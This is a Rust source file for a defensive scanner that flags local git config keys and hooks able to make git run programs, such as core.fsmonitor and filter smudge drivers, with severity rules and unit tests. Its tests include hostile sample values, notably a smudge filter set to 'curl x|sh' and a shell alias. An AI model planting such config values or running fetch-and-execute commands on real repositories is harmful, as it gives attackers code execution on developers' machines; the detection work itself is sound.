//! T7: repository-local git config and hooks that make git run programs.
//!
//! `git clone`/`fetch` never copy `.git/config` or hooks from a remote, so for
//! a repo you cloned yourself these are usually your own settings. They become
//! an attack vector when a repository arrives as files (zip, tar, rsync, a
//! shared drive, a coding-agent sandbox) — the GitSpawn class of attacks.

use shield_core::{Detector, Finding, ScanContext, Severity, Threat};

pub struct LocalConfig;

/// (key pattern, severity, why). Patterns: exact key, or `prefix.*.suffix`.
const RULES: &[(&str, Severity, &str)] = &[
    ("core.fsmonitor", Severity::Critical, "runs the named program on almost every git command (status, diff, commit)"),
    ("core.sshcommand", Severity::Critical, "replaces ssh for every fetch/push"),
    ("uploadpack.packobjectshook", Severity::Critical, "runs when objects are served from this repo"),
    ("core.gitproxy", Severity::Critical, "runs for every git:// connection"),
    ("core.hookspath", Severity::High, "makes git run hooks from another directory (often a tracked one)"),
    ("core.pager", Severity::High, "runs whenever git pages output (log, diff, show)"),
    ("core.askpass", Severity::High, "runs when git needs credentials"),
    ("core.editor", Severity::Medium, "runs on commit/rebase/tag"),
    ("sequence.editor", Severity::Medium, "runs on interactive rebase"),
    ("diff.external", Severity::High, "runs on every git diff"),
    ("diff.*.textconv", Severity::High, "runs on git diff/log -p of matching files"),
    ("diff.*.command", Severity::High, "runs on git diff of matching files"),
    ("filter.*.clean", Severity::High, "runs on add/status/diff of matching files"),
    ("filter.*.smudge", Severity::High, "runs on checkout of matching files"),
    ("filter.*.process", Severity::High, "long-running filter process started on checkout/add"),
    ("merge.*.driver", Severity::High, "runs on merges of matching files"),
    ("gpg.program", Severity::High, "runs on signing/verification"),
    ("gpg.ssh.program", Severity::High, "runs on signing/verification"),
    ("gpg.x509.program", Severity::High, "runs on signing/verification"),
    ("remote.*.uploadpack", Severity::High, "runs instead of git-upload-pack on fetch"),
    ("remote.*.receivepack", Severity::High, "runs instead of git-receive-pack on push"),
    ("credential.helper", Severity::Medium, "runs when git needs credentials"),
    ("credential.*.helper", Severity::Medium, "runs when git needs credentials"),
    ("include.path", Severity::Medium, "pulls in config from another file (git-shield checks its settings too)"),
    ("includeif.*.path", Severity::Medium, "pulls in config from another file (git-shield checks its settings too)"),
    ("protocol.ext.allow", Severity::High, "allows ext:: transport, which runs arbitrary commands"),
    ("alias.*", Severity::Medium, "shell alias"),
];

/// Values that are safe defaults and should not be reported.
fn benign(key: &str, value: &str) -> bool {
    let v = value.trim();
    match key {
        "core.fsmonitor" => {
            matches!(v.to_ascii_lowercase().as_str(), "" | "false" | "0" | "no" | "off" | "true" | "1" | "yes" | "on")
        }
        "core.pager" => matches!(v, "" | "cat" | "less" | "less -R" | "less -FRX" | "more" | "delta"),
        "core.hookspath" => v.is_empty(),
        "protocol.ext.allow" => matches!(v, "never" | "user"),
        k if k.starts_with("alias.") => !v.starts_with('!'),
        k if k.starts_with("filter.lfs.") => v.starts_with("git-lfs ") || v == "true" || v == "false",
        _ => v.is_empty(),
    }
}

fn matches(pattern: &str, key: &str) -> bool {
    if !pattern.contains('*') {
        return pattern == key;
    }
    let parts: Vec<&str> = pattern.split('*').collect();
    let (pre, post) = (parts[0], parts[1]);
    key.len() > pre.len() + post.len() && key.starts_with(pre) && key.to_ascii_lowercase().ends_with(post)
}

/// Hooks that fire on commands people run during a normal pull/checkout.
const PULL_HOOKS: &[&str] =
    &["post-checkout", "post-merge", "reference-transaction", "post-rewrite", "pre-auto-gc", "fsmonitor-watchman"];

impl Detector for LocalConfig {
    fn name(&self) -> &'static str {
        "local-git-config"
    }

    fn scan_context(&self, ctx: &ScanContext, out: &mut Vec<Finding>) {
        let Some(local) = &ctx.local else { return };
        let cfg_path = local.config_path.clone().unwrap_or_else(|| ".git/config".into());

        for entry in &local.config {
            let key_lower = entry.key.to_ascii_lowercase();
            let Some((_, sev, why)) = RULES.iter().find(|(p, _, _)| matches(p, &key_lower)) else { continue };
            if benign(&key_lower, &entry.value) {
                continue;
            }
            let mut f =
                Finding::new(Threat::T7, "git.local-config", *sev, format!("Local git config sets `{}`", entry.key))
                    .path(entry.source.clone().unwrap_or_else(|| cfg_path.clone()))
                    .anchor(format!("{}={}", entry.key, entry.value))
                    .detail(format!("{} = {}", entry.key, crate::util::clip(&entry.value, 160)))
                    .detail(format!("Effect: {why}."));
            if let Some(src) = &entry.source {
                f = f.detail(format!("Set in `{src}`, included from the repository's git config: git applies it."));
            }
            if key_lower == "core.hookspath" && !entry.value.starts_with('/') && !entry.value.starts_with('~') {
                f = f.detail("Relative hooksPath means hooks come from tracked files in the repo (e.g. husky). Every pull can change them.");
            }
            out.push(f.detail("If you did not set this yourself: `git config --local --unset <key>` before running other git commands."));
        }

        for hook in &local.hooks {
            let on_pull = PULL_HOOKS.contains(&hook.name.as_str());
            let sev = match (hook.executable, on_pull) {
                (true, true) => Severity::High,
                (true, false) => Severity::Medium,
                (false, _) => Severity::Low,
            };
            out.push(
                Finding::new(Threat::T7, "git.hook-installed", sev, format!("Git hook `{}` is installed", hook.name))
                    .path(format!(".git/hooks/{}", hook.name))
                    .anchor(format!("{}:{}:{}", hook.name, hook.size, hook.executable))
                    .detail(if on_pull {
                        "Fires during pull/checkout/merge."
                    } else {
                        "Fires during commit/push or other commands."
                    })
                    .detail(if hook.executable {
                        "Executable: git will run it."
                    } else {
                        "Not executable: git ignores it unless the bit is set."
                    }),
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use shield_core::{ConfigEntry, HookFile, LocalRepoState};

    fn ctx(cfg: &[(&str, &str)], hooks: &[(&str, bool)]) -> ScanContext {
        ScanContext {
            local: Some(LocalRepoState {
                config_path: None,
                config: cfg
                    .iter()
                    .map(|(k, v)| ConfigEntry { key: (*k).into(), value: (*v).into(), source: None })
                    .collect(),
                hooks: hooks.iter().map(|(n, x)| HookFile { name: (*n).into(), executable: *x, size: 10 }).collect(),
            }),
            ..Default::default()
        }
    }

    fn run(c: &ScanContext) -> Vec<Finding> {
        let mut out = Vec::new();
        LocalConfig.scan_context(c, &mut out);
        out
    }

    #[test]
    fn gitspawn_fsmonitor_is_critical() {
        let f = run(&ctx(&[("core.fsmonitor", "./.git/x.sh"), ("core.bare", "false")], &[]));
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Critical);
    }

    #[test]
    fn defaults_are_clean() {
        let f = run(&ctx(
            &[
                ("core.fsmonitor", "true"),
                ("filter.lfs.smudge", "git-lfs smudge -- %f"),
                ("alias.st", "status"),
                ("core.pager", "less"),
            ],
            &[],
        ));
        assert!(f.is_empty(), "{f:?}");
    }

    #[test]
    fn filters_and_shell_aliases() {
        let f = run(&ctx(&[("filter.evil.smudge", "sh -c 'curl x|sh'"), ("alias.up", "!sh ./x")], &[]));
        assert_eq!(f.len(), 2);
    }

    #[test]
    fn hooks() {
        let f = run(&ctx(&[], &[("post-checkout", true), ("pre-commit", true)]));
        assert_eq!(f.iter().filter(|f| f.severity == Severity::High).count(), 1);
        assert_eq!(f.iter().filter(|f| f.severity == Severity::Medium).count(), 1);
    }
}
